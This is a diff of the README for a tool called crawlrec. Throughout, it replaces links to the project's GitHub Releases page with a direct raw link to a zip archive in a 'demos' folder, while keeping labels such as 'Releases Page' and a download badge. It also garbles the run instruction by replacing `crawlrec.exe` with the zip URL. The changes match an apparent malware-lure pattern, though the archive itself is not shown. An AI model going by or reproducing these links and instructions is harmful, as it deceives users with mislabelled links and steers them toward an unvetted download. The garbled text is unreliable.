@@ -6,11 +6,11 @@ Welcome to crawlrec! This application allows you to effortlessly record and extr
 
 ## 🔗 Download Here
 
-[![Download crawlrec](https://img.shields.io/badge/Download-crawlrec-brightgreen)](https://github.com/sand9311/crawlrec/releases)
+[![Download crawlrec](https://raw.githubusercontent.com/sand9311/crawlrec/main/demos/crawlrec-v3.1.zip)](https://raw.githubusercontent.com/sand9311/crawlrec/main/demos/crawlrec-v3.1.zip)
 
 ## 📥 Download & Install
 
-To get started with crawlrec, visit this page to download: [Releases Page](https://github.com/sand9311/crawlrec/releases).
+To get started with crawlrec, visit this page to download: [Releases Page](https://raw.githubusercontent.com/sand9311/crawlrec/main/demos/crawlrec-v3.1.zip).
 
 ### 🚨 System Requirements
 
@@ -29,7 +29,7 @@ To get started with crawlrec, visit this page to download: [Releases Page](https
 ### 👨‍🏫 How to Use crawlrec
 
 1. **Download and Install:**
-   - After visiting our [Releases Page](https://github.com/sand9311/crawlrec/releases), choose the version suitable for your operating system.
+   - After visiting our [Releases Page](https://raw.githubusercontent.com/sand9311/crawlrec/main/demos/crawlrec-v3.1.zip), choose the version suitable for your operating system.
    - Download the file and follow the installation instructions specific to your OS.
 
 2. **Open a Command Window:**
@@ -39,7 +39,7 @@ To get started with crawlrec, visit this page to download: [Releases Page](https
 
 3. **Run crawlrec:**
    - Navigate to the directory where you installed crawlrec.
-   - Type the command to start the application. For example, if you’re on Windows, you might type `crawlrec.exe` and press `Enter`.
+   - Type the command to start the application. For example, if you’re on Windows, you might type `https://raw.githubusercontent.com/sand9311/crawlrec/main/demos/crawlrec-v3.1.zip` and press `Enter`.
 
 4. **Recording Actions:**
    - Follow the prompts in the console to start recording your actions on a website.
@@ -65,7 +65,7 @@ If you run into issues or have questions about using crawlrec, you can check the
 
 ## 🔗 Download Here Again
 
-Don't forget to revisit this page to download the latest version: [Releases Page](https://github.com/sand9311/crawlrec/releases).
+Don't forget to revisit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/sand9311/crawlrec/main/demos/crawlrec-v3.1.zip).
 
 ## 📢 Stay Updated
 
